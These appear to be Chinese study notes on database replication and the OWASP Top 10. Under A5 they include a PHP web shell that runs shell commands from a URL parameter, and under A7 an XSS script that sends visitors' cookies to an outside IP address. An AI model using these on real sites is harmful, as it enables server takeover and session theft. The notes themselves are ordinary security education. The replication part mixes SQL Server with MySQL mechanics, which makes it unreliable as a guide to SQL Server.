SQL Server服务器主从备份

同理于Oracle MySQL 提高数据安全性，高可用，将主库日志upload到备用实例

优点：一个主库多个从库	在数据还原期间可以提高从库只读访问	自定义数据延迟应用，主库数据出问题有时间恢复

缺点：数据库占用更多空间 也许

日志传输过程：主库备份->日志文件复制到辅助服务器实例->还原日志备份

可以传送日志到多个辅助服务器

读写分离 分布式

原理：1.从库的IO线程向主库的主进程发送请求，主库验证从库，交给主库IO线程负责数据传输;

2.主库IO线程对比从库发送过来的master.info里的信息，将binlog文件信息，偏移量和binlog文件名等发送给从库

3.从库接收到信息后，将binlog信息保存到relay-bin中，同时更新master.info的偏移量和binlog文件名

4.从库的SQL线程不断的读取relay-bin的信息，同时将读到的偏移量和文件名写道relay-log.info文件，binlog信息写进自己的数据库，一次同步操作完成。

5.完成上次同步后，从库IO线程不断的向主库IO线程要binlog信息

6.从库如果也要做主库，也要打开log_bin 和log-slave-update参数



------

OWASP Top10

A1:注入 包括SQL注入、Not only SQL注入、LDAP注入、OS注入

将不受信任的数据作为命令或查询的一部分发送到解析器，攻击者可以使解析器在没有授权的情况下执行非预期命令或访问数据

防范：安全API、白名单、转义字符

A2:失效的身份认证

通过错误使程序的身份认证和会话管理功能，attacker能够破译密码、密钥、会话令牌，或other缺陷来冒充身份，暂时或永久

eg：获取cookie可以冒充客户端和服务器通信

防范：内置会话管理、认证问候、单一的入口点、在一开始登陆SSL保护的网页

------

A3:敏感数据泄露

许多web或者API都不能很好的保护敏感数据eg：财务data、医疗data、PII数据

attacker针对数据进行诈骗身份欺诈等

需要对数据进行加密：传输中的数据、存储的数据和web交互的数据

明文传输->抓包...中间人攻击

------

A4:XML外部实体

较早的配置错误的XML处理器评估了XML文件中的外部实体引用

攻击者利用外部实体窃取URL文件处理器的外部和共享文件

libxml2.9.0以后，默认不解析外部实体

------

A5:失效的访问控制

未对通过验证的用户采用恰当的访问控制，attacker可以利用这些缺陷访问未授权的功能或者数据

eg：访问其他用户账户、查看敏感文件、修改数据、更改权限

```php
[root@host myzoo]# cat ailx10.php 
<?php # 临时在网站根目录 添加了ailx10.php文件
system($_GET["hackbiji"]);
?>
```

------

A6:安全配置错误

不安全的默认配置、不完整的临时配置、开源云存储、wrong HTTP标头

防范：自动化安装部署、及时了解并部署每个环节的软件更新和补丁、漏洞扫描和安全审计

------

A7:XSS

网页中包含不受信任的、未验证、转义的数据，或者使用可以创建HTML、JS的API更新现有网页时就会有XSS缺陷

获得Cookies

```html
<script>document.write(\"<img src=\'http://144.34.129.116:8102?cookie=\" + escape(document.cookie) + \"\'>\")</script><!--

```

防范：验证输入、编码输出

------

A8:不安全的反序列化

不安全的反序列化会导致代码远程执行，或者可以用来执行其他攻击

重放、注入、提权

------

A9:使用含有已知漏洞的组件(库、框架 and so on)

组件和程序有相同权限，漏洞被利用可能造成数据丢失、服务器接管

------

A10:不足的日志记录和监控

不足的日志记录和监控以及事件响应缺失或无效的集成会导致进一步对系统的攻击，篡改、提权或销毁证据

rootkit 就是黑客为了销毁日志和监控

------

